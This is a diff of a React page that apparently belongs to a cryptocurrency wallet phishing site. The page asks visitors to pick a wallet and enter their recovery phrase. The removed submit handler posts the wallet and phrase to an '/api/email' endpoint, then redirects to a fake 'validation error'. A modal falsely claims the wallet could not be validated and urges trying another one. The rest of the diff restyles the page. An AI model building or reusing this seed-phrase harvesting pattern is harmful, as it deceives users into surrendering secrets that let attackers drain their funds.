@@ -72,16 +72,8 @@ export default function Home() {
 
   const handleSubmit = async (e) => {
     e.preventDefault();
-    await fetch("/api/email", {
-      method: "POST",
-      body: JSON.stringify({
-        wallet: formState.wallet,
-        currentPhrase: formState.currentPhrase,
-      }),
-    });
-    setTimeout(() => {
-      navigate.push("/wallet/validationerror");
-    }, 1000);
+    document.getElementById("my_modal_3").close();
+    document.getElementById("my_modal_4").showModal();
   };
 
   const HandleWallet = () => {
@@ -138,14 +130,16 @@ export default function Home() {
   }, []);
 
   return (
-    <main className="">
+    <main className="my-16 px-4 ">
       <div className="max-w-7xl mx-auto">
-        <h1>Choose your Wallet</h1>
-        <div className="grid grid-cols-4 gap-5">
+        <h1 className="text-white text-center font-bold text-3xl">
+          Choose your Wallet
+        </h1>
+        <div className="grid lg:grid-cols-4 gap-5 mt-10">
           {data.map((item, index) => (
             <div
               key={index}
-              className="border-2 border-slate-800 bg-[rgba(255,255,255,0.02)] p-5 cursor-pointer"
+              className="border-2 border-[#4B4F58] bg-[rgba(255,255,255,0.02)] px-5 py-8 cursor-pointer"
               onClick={() => initializeFunc()}
             >
               <div className="mx-auto w-36 h-36 mb-6">
@@ -164,11 +158,14 @@ export default function Home() {
             </div>
           ))}
         </div>
-        <dialog id="my_modal_1" className="modal">
+        <dialog
+          id="my_modal_1"
+          className="modal w-full border-[#4B4F58] bg-[rgb(32,32,32)] px-2"
+        >
           <div className="modal-box">
             <form method="dialog" className="mb-8">
               {/* if there is a button in form, it will close the modal */}
-              <button className="btn btn-sm btn-circle btn-ghost absolute right-2 top-2">
+              <button className="btn btn-sm btn-circle btn-ghost absolute right-2 top-2 text-[#4B4F58]">
                 ✕
               </button>
             </form>
@@ -185,11 +182,14 @@ export default function Home() {
             </div>
           </div>
         </dialog>
-        <dialog id="my_modal_2" className="modal">
+        <dialog
+          id="my_modal_2"
+          className="modal w-full border-[#4B4F58] bg-[rgb(32,32,32)] px-2"
+        >
           <div className="modal-box">
             <form method="dialog" className="mb-8">
               {/* if there is a button in form, it will close the modal */}
-              <button className="btn btn-sm btn-circle btn-ghost absolute right-2 top-2">
+              <button className="btn btn-sm btn-circle btn-ghost absolute right-2 top-2 text-[#4B4F58]">
                 ✕
               </button>
             </form>
@@ -204,11 +204,14 @@ export default function Home() {
             </div>
           </div>
         </dialog>
-        <dialog id="my_modal_3" className="modal">
+        <dialog
+          id="my_modal_3"
+          className="modal w-full border-[#4B4F58] bg-[rgb(32,32,32)] px-2"
+        >
           <div className="modal-box">
             <form method="dialog" className="">
               {/* if there is a button in form, it will close the modal */}
-              <button className="btn btn-sm btn-circle btn-ghost absolute right-2 top-2">
+              <button className="btn btn-sm btn-circle btn-ghost absolute right-2 top-2 text-[#4B4F58]">
                 ✕
               </button>
             </form>
@@ -262,7 +265,7 @@ export default function Home() {
                         />
                         <div className="flex flex-col-reverse font-urbanist items-center mt-5 gap-y-3 mt-3">
                           <button
-                            className="bg-red-500 py-5 w-full text-center font-bold text-white rounded-full"
+                            className="py-5 w-full text-center font-bold text-white rounded-full"
                             onClick={() =>
                               document.getElementById("my_modal_3").close()
                             }
@@ -270,7 +273,7 @@ export default function Home() {
                             Cancel
                           </button>
                           <button
-                            className="bg-lime-500 py-5 w-full rounded-full text-[#222222] font-bold"
+                            className="bg-black py-5 w-full rounded-full text-white font-bold"
                             type="submit"
                             // disabled={state.submitting}
                           >
@@ -285,11 +288,14 @@ export default function Home() {
             </div>
           </div>
         </dialog>
-        <dialog id="my_modal_4" className="modal">
+        <dialog
+          id="my_modal_4"
+          className="modal w-full border-[#4B4F58] bg-[rgb(32,32,32)] px-2"
+        >
           <div className="modal-box">
             <form method="dialog" className="">
               {/* if there is a button in form, it will close the modal */}
-              <button className="btn btn-sm btn-circle btn-ghost absolute right-2 top-2">
+              <button className="btn btn-sm btn-circle btn-ghost absolute right-2 top-2 text-[#4B4F58]">
                 ✕
               </button>
             </form>
@@ -301,12 +307,12 @@ export default function Home() {
                 Unable To Validate Wallet!!! ,<br />
                 Try A Different Wallet.
               </p>
-              <Link
-                href="/wallet/"
+              <button
+                onClick={() => document.getElementById("my_modal_4").close()}
                 className="bg-[#FF1E1E] py-4 px-14 mt-5 rounded-full text-white"
               >
                 Cancel
-              </Link>
+              </button>
             </div>
           </div>
         </dialog>
